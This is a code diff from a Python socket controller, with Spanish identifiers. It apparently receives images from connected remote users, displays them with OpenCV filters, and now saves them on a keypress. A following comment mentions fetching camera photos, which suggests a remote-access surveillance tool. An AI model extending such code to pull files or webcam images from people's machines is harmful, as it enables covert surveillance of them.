@@ -543,58 +543,68 @@ class TCP:
         self.__conexion.send(cmd.encode())
 
         msg = self.__conexion.recv(1024).decode()
-        if msg[:6] != "error:":
-            self.__conexion.send("ok".encode())
-            nombre = self.__conexion.recv(1024).decode()
+        self.printMsg(msg)
 
-            self.__conexion.send("ok".encode())
-            info = self.recibirDatos()
+        if msg[0:3] == '[!]':
+            return
 
-            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
-            imagen = cv2.imdecode(matriz, -1)
+        self.__conexion.send("ok".encode())
+        nombre = self.__conexion.recv(1024).decode()
 
-            if '-t' in params.keys():
-                escala = float(params['-t'])
-            else:
-                height, width = imagen.shape[:2]
-                escala = self.escalar(height, width)
-            imagen = cv2.resize(imagen, None, fx=escala, fy=escala)
-            print(Fore.CYAN + "[*] Escala:", escala)
+        self.__conexion.send("ok".encode())
+        info = self.recibirDatos()
 
-            if flags:
-                if re.search("90", flags):
-                    imagen = cv2.rotate(imagen, cv2.ROTATE_90_COUNTERCLOCKWISE)
-                if re.search("180", flags):
-                    imagen = cv2.rotate(imagen, cv2.ROTATE_180)
-                if re.search("270", flags):
-                    imagen = cv2.rotate(imagen, cv2.ROTATE_90_CLOCKWISE)
-                if re.search("x", flags):
-                    imagen = cv2.flip(imagen, 0)
-                if re.search("y", flags):
-                    imagen = cv2.flip(imagen, 1)
-                if re.search("g", flags):
-                    imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
-                    imagen = cv2.cvtColor(imagen, cv2.COLOR_GRAY2BGR)
-                if re.search("n", flags):
-                    imagen = 255 - imagen
-                if re.search("m", flags):
-                    flip = cv2.flip(imagen, 1)
-                    imagen = numpy.hstack((imagen, flip))
-                if re.search("c", flags):
-                    grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
-                    blur = cv2.GaussianBlur(grises, (3,3), 0)
-                    t1 = int(input("Threshold1: "))
-                    t2 = int(input("Threshold2: "))
-                    canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
-                    imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)
+        matriz = numpy.frombuffer(info, dtype=numpy.uint8)
+        original = cv2.imdecode(matriz, -1)
 
-            print(Fore.CYAN + f"[*] {self.__userName}@{self.__addr[0]}:", nombre)
-            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: {nombre}", imagen)
-            cv2.waitKey()
-            cv2.destroyAllWindows()
-
+        if '-t' in params.keys():
+            escala = float(params['-t'])
         else:
-            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
+            height, width = original.shape[:2]
+            escala = self.escalar(height, width)
+        imagen = cv2.resize(original, None, fx=escala, fy=escala)
+        print(Fore.CYAN + "[*] Escala:", escala)
+
+        if flags:
+            if re.search("90", flags):
+                imagen = cv2.rotate(imagen, cv2.ROTATE_90_COUNTERCLOCKWISE)
+            if re.search("180", flags):
+                imagen = cv2.rotate(imagen, cv2.ROTATE_180)
+            if re.search("270", flags):
+                imagen = cv2.rotate(imagen, cv2.ROTATE_90_CLOCKWISE)
+            if re.search("x", flags):
+                imagen = cv2.flip(imagen, 0)
+            if re.search("y", flags):
+                imagen = cv2.flip(imagen, 1)
+            if re.search("g", flags):
+                imagen = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
+                imagen = cv2.cvtColor(imagen, cv2.COLOR_GRAY2BGR)
+            if re.search("n", flags):
+                imagen = 255 - imagen
+            if re.search("m", flags):
+                flip = cv2.flip(imagen, 1)
+                imagen = numpy.hstack((imagen, flip))
+            if re.search("c", flags):
+                grises = cv2.cvtColor(imagen, cv2.COLOR_BGR2GRAY)
+                blur = cv2.GaussianBlur(grises, (3,3), 0)
+                t1 = int(input("Threshold1: "))
+                t2 = int(input("Threshold2: "))
+                canny = cv2.Canny(image=blur, threshold1=t1, threshold2=t2)
+                imagen = cv2.cvtColor(canny, cv2.COLOR_GRAY2BGR)
+
+        print(Fore.CYAN + f"[*] {self.__userName}@{self.__addr[0]}:", nombre)
+        cv2.imshow(f"{self.__userName}@{self.__addr[0]}: {nombre}", imagen)
+
+        while True:
+            key = cv2.waitKey()
+
+            if key == 27:
+                break
+            if key == ord('s'):
+                cv2.imwrite(f"{nombre}", original)
+                print(Fore.GREEN + f"[+] Foto \"{nombre}\" guardada")
+                break
+        cv2.destroyAllWindows()
 
     # Funcion para recibir una foto de la camara y visualizarla
     # cmd --> comando ingresado
